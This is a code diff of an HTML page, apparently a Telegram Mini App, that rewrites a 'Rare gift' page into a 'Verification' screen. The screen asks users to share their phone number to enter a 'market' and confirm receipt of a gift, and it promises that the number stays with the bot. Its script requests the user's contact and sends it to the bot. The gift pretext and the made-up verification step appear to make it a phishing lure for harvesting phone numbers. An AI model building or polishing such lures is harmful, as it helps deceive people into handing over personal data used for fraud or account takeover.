@@ -3,10 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Редкий подарок</title>
+  <title>Верификация</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-
     * {
       margin: 0;
       padding: 0;
@@ -14,93 +15,81 @@
     }
 
     body {
-      height: 100vh;
-      background: linear-gradient(135deg, #0a0e17 0%, #121826 100%);
-      color: #e0e7ff;
+      min-height: 100vh;
+      background: #0f121a;
+      color: #d1d5db;
       font-family: 'Inter', system-ui, sans-serif;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
+      padding: 1.5rem;
     }
 
-    .container {
-      text-align: center;
-      padding: 2rem;
+    .card {
+      background: #161b22;
+      border-radius: 16px;
+      padding: 2.5rem 2rem;
+      width: 100%;
       max-width: 380px;
-      width: 90%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      border: 1px solid #2d3748;
+      text-align: center;
     }
 
-    .icon {
-      font-size: 5rem;
-      margin-bottom: 1.5rem;
-      animation: float 3s ease-in-out infinite;
-    }
-
-    h1 {
-      font-size: 2.2rem;
+    .title {
+      font-size: 1.6rem;
       font-weight: 600;
       margin-bottom: 1rem;
-      background: linear-gradient(90deg, #60a5fa, #a5b4fc);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #e2e8f0;
     }
 
-    p {
-      font-size: 1.1rem;
-      opacity: 0.8;
-      margin-bottom: 2.5rem;
+    .subtitle {
+      font-size: 1rem;
       line-height: 1.5;
+      color: #94a3b8;
+      margin-bottom: 2.5rem;
     }
 
     .btn {
-      background: linear-gradient(135deg, #3b82f6, #6366f1);
+      background: #2563eb;
       color: white;
       border: none;
-      padding: 1rem 2.5rem;
-      font-size: 1.2rem;
-      font-weight: 600;
-      border-radius: 16px;
+      padding: 1rem 2.2rem;
+      font-size: 1.05rem;
+      font-weight: 500;
+      border-radius: 12px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+      transition: all 0.25s ease;
+      width: 100%;
+      max-width: 260px;
+      margin: 0 auto;
+      display: block;
     }
 
     .btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 15px 35px rgba(59, 130, 246, 0.6);
+      background: #3b82f6;
+      transform: translateY(-1px);
     }
 
-    .loader {
-      display: none;
-      margin: 2rem auto;
-      width: 60px;
-      height: 60px;
-      border: 5px solid #334155;
-      border-top: 5px solid #60a5fa;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
+    .info {
+      margin-top: 1.8rem;
+      font-size: 0.85rem;
+      color: #64748b;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="icon"></div>
-    <h1>Получение Подарка</h1>
-    <p>Подтвердить номер Телефона</p>
+  <div class="card">
+    <div class="title">Для входа в маркет</div>
+    <div class="subtitle">пройдите верификацию</div>
+
     <button class="btn" id="grant">Поделиться номером</button>
-    <div class="loader" id="loader"></div>
+
+    <div class="info">
+      Это нужно для подтверждения получения подарка<br>
+      Ваш номер виден только боту и не передаётся третьим лицам
+    </div>
   </div>
 
   <script>
@@ -108,13 +97,7 @@
     tg.ready();
     tg.expand();
 
-    const btn = document.getElementById('grant');
-    const loader = document.getElementById('loader');
-
-    btn.addEventListener('click', async () => {
-      btn.style.display = 'none';
-      loader.style.display = 'block';
-
+    document.getElementById('grant').onclick = async () => {
       try {
         const contact = await tg.requestContact();
         tg.sendData(JSON.stringify({
@@ -127,10 +110,8 @@
         tg.close();
       } catch (e) {
         tg.sendData(JSON.stringify({ error: e.message || 'denied' }));
-        loader.style.display = 'none';
-        btn.style.display = 'block';
       }
-    });
+    };
   </script>
 </body>
 </html>
